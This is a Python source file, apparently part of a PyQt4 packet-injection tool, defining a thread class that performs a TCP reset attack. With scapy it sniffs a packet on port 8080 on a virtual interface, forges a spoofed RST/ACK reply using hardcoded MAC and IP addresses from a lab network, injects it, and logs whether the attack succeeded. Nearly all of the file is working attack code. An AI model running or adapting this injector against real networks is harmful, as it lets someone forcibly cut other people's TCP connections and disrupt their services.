from PyQt4.QtCore import QThread
from scapy.all import *
from injector_lib import getFlags

class Attack_RST(QThread):
    def __init__(self):
        QThread.__init__(self)
        self.textBox = None

    def __del__(self):
        self.wait()

    def setTextBox(self, log_textBox, original_textBox, new_textBox):
        self.log_textBox = log_textBox
        self.original_textBox = original_textBox
        self.new_textBox = new_textBox

    def inj(self, pacote, pkt):
        self.original_textBox.setText("Trigged packet:\n src IP: "+ pkt[IP].src + "\n dst IP: " + pkt[IP].dst + "\n ACK: " + str(pkt[TCP].ack) + "\n SEQ: " + str(pkt[TCP].seq) + "\n flags: " + str(getFlags(pkt[TCP].flags)))
        pacote[TCP].dport = pkt[TCP].sport
        pacote[TCP].ack = pkt[TCP].seq + 1
        del pacote[IP].chksum
        del pacote[TCP].chksum
        #pacote.show2()
        #for i in range(0, 15):
        sendp(pacote, iface="virbr0")
        self.new_textBox.setText("Trigged packet:\n src IP: "+ pacote[IP].src + "\n dst IP: " + pacote[IP].dst + "\n ACK: " + str(pacote[TCP].ack) + "\n SEQ: " + str(pacote[TCP].seq) + "\n flags: " + str(getFlags(pacote[TCP].flags)))
        sniffing  = sniff(iface = "virbr0", filter = "port 8080", count = 2)
        flags = str(getFlags(sniffing[1][TCP].flags))
        if 'RST' in flags:
            self.log_textBox.appendText("\nRST attack successfull!\n")
        else:
            self.log_textBox.appendText("\nRST attack failed.\n")

    def attack(self):
        pacote = Ether()/IP()/TCP()

        # Ether
        pacote[Ether].dst = "52:54:00:d4:c2:37"
        pacote[Ether].src = "52:54:00:f4:4a:bc"

        # IP
        pacote[IP].ihl = 5
        pacote[IP].id = 1298
        pacote[IP].flags="DF"
        pacote[IP].src = "192.168.122.95"
        pacote[IP].dst = "192.168.122.142"
        pacote[IP].len = 40
        #pacote[IP].chksum =  0x7d9e


        # TCP
        pacote[TCP].sport = 8080
        pacote[TCP].seq = 0
        pacote[TCP].dataofs=5
        pacote[TCP].flags="RA"
        pacote[TCP].window=0
        #pacote[TCP].chksum=0x274a
        pacote[TCP].options={}

        sniffing  = sniff(iface = "virbr0", filter = "port 8080", count = 1)
        self.inj(pacote, sniffing[0])

    def run(self):
        self.attack()
